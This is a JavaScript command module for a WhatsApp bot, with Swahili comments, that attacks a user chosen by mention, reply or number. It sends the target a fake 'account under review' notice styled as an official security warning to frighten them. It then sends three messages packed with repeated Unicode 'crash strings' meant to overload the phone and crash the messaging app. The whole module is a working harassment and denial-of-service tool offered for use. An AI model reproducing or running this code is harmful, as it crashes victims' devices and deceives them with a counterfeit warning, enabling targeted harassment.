// VEX MINI BOT - VEX: blocker
// Nova: High-intensity Unicode Stress for node neutralization.
// Dev: Lupin Starnley (VEX Creator)

module.exports = {
    vex: 'blocker',
    cyro: 'supreme',
    nova: 'Neutralizes malicious nodes using high-density Unicode payloads.',

    async execute(m, sock) {
        const text = m.text.trim().split(/ +/).slice(1).join(" ");
        
        await sock.sendMessage(m.key.remoteJid, { react: { text: "🚫", key: m.key } });

        // 1. RESOLVE TARGET (Kutambua namba ya mlengwa)
        let jid;
        if (m.mentionedJid && m.mentionedJid[0]) {
            jid = m.mentionedJid[0];
        } else if (m.quoted) {
            jid = m.quoted.sender;
        } else if (text) {
            jid = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        } else {
            return m.reply("⚠️ *VEX BLOCKER:* Target node required.\nUsage: `.blocker @tag` or reply to a message.");
        }

        // SAFETY: Inazuia bot isijishambulie yenyewe au kukushambulia wewe (Master)
        const botId = sock.user.id.split(':')[0] + '@s.whatsapp.net';
        if (jid === botId || jid === m.sender) {
            return m.reply("🛡️ *VEX SAFETY:* Operation aborted. Cannot neutralize Master or Self Node.");
        }

        // 2. PHASE ONE: THE AUTHENTIC WARNING (Psychological Impact)
        const reviewMsg = `*VEX SECURITY PROTOCOL: ACCOUNT UNDER REVIEW*\n\n` +
            `Your account has been flagged for fraudulent activity and malicious behavior by the VEX MINI BOT Network.\n\n` +
            `*Status:* 🔴 CRITICAL\n` +
            `*Directive:* Your WhatsApp node is being restricted. If this is a mistake, contact WhatsApp Support immediately.\n\n` +
            `_System: Lupin Starnley (VEX Master)_`;
        
        try {
            await sock.sendMessage(jid, { text: reviewMsg });
            await new Promise(resolve => setTimeout(resolve, 2500)); // Tactical delay

            // 3. PHASE TWO: THE SUPREME PAYLOAD (Unicode Crash Strings)
            // Hizi herufi ni nzito sana kwenye RAM ya simu za kawaida
            const crashStrings = "⚝".repeat(2000) + "‎".repeat(5000) + "జ్ఞా".repeat(1000) + "ॵ".repeat(1000) + "ꦿ".repeat(1000);
            const bugPayload = `VEX_PROTOCOL_OVERLOAD\n${crashStrings}\n_Neutralization_Active_`;

            m.reply(`🚀 *NEUTRALIZATION INITIATED*\n🎯 *Target:* ${jid.split('@')[0]}\n⚡ *Method:* Unicode Stress (V9)\n\n_System: Cloaking active. Anti-ban engaged._`);

            // Tuma Payload mara 3 ili kuhakikisha node imekuwa saturated
            for (let i = 0; i < 3; i++) {
                await sock.sendMessage(jid, { text: bugPayload });
                await new Promise(resolve => setTimeout(resolve, 3500)); // Delay ya usalama kwako
            }

            await m.reply("✅ *OPERATION COMPLETE:* Target node saturated and neutralized.");

        } catch (e) {
            console.error("BLOCKER FAIL:", e);
            m.reply("❌ *PROTOCOL ERROR:* Target node unreachable or encryption level too high.");
        }
    }
};
